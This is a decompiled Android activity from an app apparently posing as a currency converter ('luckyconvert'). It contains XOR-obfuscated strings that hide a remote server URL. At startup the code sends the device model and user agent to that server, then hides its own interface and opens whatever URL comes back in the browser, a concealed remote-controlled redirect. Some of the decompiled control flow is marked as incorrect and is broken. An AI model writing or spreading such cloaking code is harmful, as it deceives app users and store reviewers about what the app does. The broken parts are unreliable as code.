package com.ratebook.luckyconvert;

import K.A0;
import K.y0;
import P0.c;
import T.u;
import W0.a;
import X0.e;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.ratebook.luckyconvert.MainActivity;
import com.ratebook.luckyconvert.R;
import e1.d;
import e1.l;
import g.AbstractActivityC0126i;
import g.C0124g;
import g.C0125h;
import i1.m;
import i1.o;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0126i {

    /* renamed from: D, reason: collision with root package name */
    public static final /* synthetic */ int f1864D = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1865A;

    /* renamed from: B, reason: collision with root package name */
    public SharedPreferences f1866B;

    /* renamed from: C, reason: collision with root package name */
    public String f1867C;

    /* renamed from: y, reason: collision with root package name */
    public final c f1868y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1869z;

    public MainActivity() {
        this.d.f2376b.e("androidx:appcompat", new C0124g(this));
        h(new C0125h(this));
        this.f1868y = new c(new a() { // from class: N0.a
            @Override // W0.a
            public final Object a() {
                int i = MainActivity.f1864D;
                KeyEvent.Callback callback = null;
                int i2 = 0;
                View inflate = MainActivity.this.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                if (inflate instanceof ViewGroup) {
                    ViewGroup viewGroup = (ViewGroup) inflate;
                    int childCount = viewGroup.getChildCount();
                    while (true) {
                        if (i2 >= childCount) {
                            break;
                        }
                        KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                        if (findViewById != null) {
                            callback = findViewById;
                            break;
                        }
                        i2++;
                    }
                }
                WebView webView = (WebView) callback;
                if (webView != null) {
                    return new O0.a(constraintLayout, webView);
                }
                throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
            }
        });
        this.f1869z = t(new byte[]{-119, -15, 49});
        this.f1865A = t(new byte[]{-104, -30, 36, -84});
    }

    public static String t(byte[] bArr) {
        int[] iArr = {(int) 234, (int) 151, (int) 86, (int) 192};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i3 % 4] ^ (bArr[i2] & 255))));
            i2++;
            i3++;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, e1.a.f1912a);
    }

    /* JADX WARN: Code restructure failed: missing block: B:24:0x0196, code lost:
    
        r3 = r4;
     */
    @Override // g.AbstractActivityC0126i, a.l, android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1866B = getSharedPreferences(this.f1869z, 0);
        setContentView(((O0.a) this.f1868y.a()).f617a);
        u();
        WebSettings settings = ((O0.a) this.f1868y.a()).f618b.getSettings();
        e.d(settings, "getSettings(...)");
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        ((O0.a) this.f1868y.a()).f618b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        SharedPreferences sharedPreferences = this.f1866B;
        g gVar2 = null;
        if (sharedPreferences == null) {
            e.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1865A, null);
        if (string != null && !d.q0(string)) {
            this.f1867C = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{-43, -10, 38, -80, -41});
        String str = t(new byte[]{-126, -29, 34, -80, -103, -83, 121, -17, -99, -2, 56, -76, -113, -27, 123, -90, -104, -8, 37, -76, -57, -93, 100, -94, -114, -71, 58, -71, -98, -31, 32, -73, -124, -12, 53, -19, -124, -10, 34, -91, -113, -96, 96, -18, -99, -8, 36, -85, -113, -27, 37, -18, -114, -14, 32, -17}) + t2 + packageName;
        o oVar = new o();
        u uVar = new u(4);
        e.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            e.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            e.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        e.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        uVar.f746a = lVar.a();
        String t3 = t(new byte[]{-78, -70, 18, -91, -100, -2, 53, -91, -57, -38, 57, -92, -113, -5});
        String str2 = Build.MODEL;
        e.d(str2, "MODEL");
        uVar.l(t3, str2);
        uVar.l(t(new byte[]{-85, -12, 53, -91, -102, -29, 123, -116, -117, -7, 49, -75, -117, -16, 51}), t(new byte[]{-113, -7, 123, -107, -71, -69, 51, -82, -47, -26, 107, -16, -60, -82}));
        String t4 = t(new byte[]{-65, -28, 51, -78, -57, -42, 49, -91, -124, -29});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        e.d(defaultUserAgent, "getDefaultUserAgent(...)");
        uVar.l(t4, defaultUserAgent);
        H.e b2 = uVar.b();
        j jVar = new j(oVar, b2);
        B.j jVar2 = new B.j(this, this.f1865A);
        if (!jVar.f3212e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3552a;
        jVar.f3213f = n.f3552a.g();
        u uVar2 = oVar.f2460a;
        g gVar3 = new g(jVar, jVar2);
        uVar2.getClass();
        synchronized (uVar2) {
            ((ArrayDeque) uVar2.f747b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) uVar2.f748c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (e.a(((m) gVar.f3206c.f3210b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) uVar2.f747b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (e.a(((m) gVar.f3206c.f3210b.f213c).d, str3)) {
                        }
                    }
                }
            }
            if (gVar2 != null) {
                gVar3.f3205b = gVar2.f3205b;
            }
        }
        uVar2.r();
    }

    @Override // g.AbstractActivityC0126i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1867C;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.m0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.P();
        y0Var.p0();
    }

    public final void v() {
        WebView webView = ((O0.a) this.f1868y.a()).f618b;
        webView.setVisibility(0);
        webView.loadUrl(t(new byte[]{-116, -2, 58, -91, -48, -72, 121, -17, -117, -7, 50, -78, -123, -2, 50, -97, -117, -28, 37, -91, -98, -72, 63, -82, -114, -14, 46, -18, -126, -29, 59, -84}));
    }

    public final void w(String str) {
        ((O0.a) this.f1868y.a()).f618b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
